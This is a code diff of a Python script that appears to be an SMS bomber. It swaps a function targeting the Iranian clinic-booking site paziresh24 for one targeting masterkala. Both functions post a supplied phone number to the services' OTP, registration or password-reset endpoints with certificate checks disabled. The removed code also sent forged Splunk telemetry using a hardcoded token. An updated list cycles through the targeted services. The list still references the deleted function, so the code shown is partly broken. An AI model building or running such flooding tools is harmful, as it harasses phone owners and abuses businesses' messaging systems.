@@ -66,113 +66,47 @@ def send_service_safe(service, phone):
 
 
 
-def paziresh24(phone):
+def masterkala(phone):
     try:
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
         formatted_phone = f"0{formatted_phone}"
         
-        session = requests.Session()
-        
-        # 1. Splunk Load Event
-        splunk_headers = {
-            "Authorization": "Splunk cd46b97e-bf0d-46e4-ba7e-111c2f88291f",
+        headers = {
+            "Accept": "application/json",
             "Content-Type": "application/json",
+            "Authorization": "Bearer your_token_here",  # اگر نیاز به توکن دارد
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+            "Origin": "https://masterkala.com",
+            "Referer": "https://masterkala.com/"
         }
         
-        load_event = {
-            "sourcetype": "_json",
-            "event": {
-                "event_group": "legacy-login-steps",
-                "event_type": "load",
-                "url": {
-                    "href": "https://www.paziresh24.com/patient/",
-                    "query": "",
-                    "pathname": "/patient/",
-                    "host": "www.paziresh24.com"
-                },
-                "popupForm": True,
-                "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
-                "terminal_id": "clinic-68b0f1d69b0897.11243898",
-                "is_application": False
-            }
+        payload = {
+            "type": "sendotp",
+            "phone": formatted_phone
         }
         
-        session.post(
-            "https://gozargah-splunk.paziresh24.com/services/collector",
-            json=load_event,
-            headers=splunk_headers,
-            timeout=5,
-            verify=False
-        )
-        
-        # 2. Splunk Submit Event
-        submit_event = {
-            "sourcetype": "_json",
-            "event": {
-                "event_group": "legacy-login-steps", 
-                "event_type": "submit-mobile-number",
-                "url": {
-                    "href": "https://www.paziresh24.com/patient/",
-                    "query": "",
-                    "pathname": "/patient/",
-                    "host": "www.paziresh24.com"
-                },
-                "popupForm": True,
-                "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
-                "terminal_id": "clinic-68b0f1d69b0897.11243898",
-                "is_application": False,
-                "phone_number": formatted_phone
-            }
-        }
-        
-        session.post(
-            "https://gozargah-splunk.paziresh24.com/services/collector", 
-            json=submit_event,
-            headers=splunk_headers,
-            timeout=5,
-            verify=False
-        )
-        
-        # 3. ارسال درخواست رجیستر
-        api_headers = {
-            "Accept": "application/json, text/plain, */*",
-            "accept-timezone": "Asia/Tehran",
-            "content-type": "application/json; charset=utf-8",
-        }
-        
-        payload = {"mobile": formatted_phone}
-        
-        # ابتدا درخواست رجیستر
-        response1 = session.post(
-            "https://apigw.paziresh24.com/gozargah/register",
+        response = requests.post(
+            "https://masterkala.com/api/2.1.1.0.0/?route=profile/otp",
             json=payload,
-            headers=api_headers,
+            headers=headers,
             timeout=10,
             verify=False
         )
-        print(f'{y}[paziresh24] Register Status: {response1.status_code}{a}')
         
-        # انتظار 65 ثانیه قبل از ارسال درخواست ریست پسورد
-        print(f'{y}[!] Waiting 65 seconds before reset password request...{a}')
-        time.sleep(65)
+        print(f'{y}[masterkala] Status: {response.status_code}{a}')
+        print(f'{y}[masterkala] Response: {response.text}{a}')
         
-        # سپس درخواست ریست پسورد
-        response2 = session.post(
-            "https://apigw.paziresh24.com/gozargah/resetpassword",
-            json=payload,
-            headers=api_headers,
-            timeout=10,
-            verify=False
-        )
-        print(f'{y}[paziresh24] Reset Password Status: {response2.status_code}{a}')
-        
-        print(f'{g}(paziresh24) All requests sent with delay! ✅{a}')
-        return True
+        if response.status_code == 200:
+            print(f'{g}(masterkala) OTP sent successfully! ✅{a}')
+            return True
+        else:
+            print(f'{r}[-] masterkala error: {response.status_code}{a}')
+            return False
             
     except Exception as e:
-        print(f'{r}[!] paziresh24 exception: {e}{a}')
+        print(f'{r}[!] masterkala exception: {e}{a}')
         return False
-                
+        
 
 
 def tebinja(phone):
@@ -340,7 +274,7 @@ def drto(phone):
 
 
 services = [
-    alibaba, snapp, tebinja, drto, paziresh24
+    alibaba, snapp, tebinja, drto, paziresh24‏, masterkala
 ]
 
 # ==========================
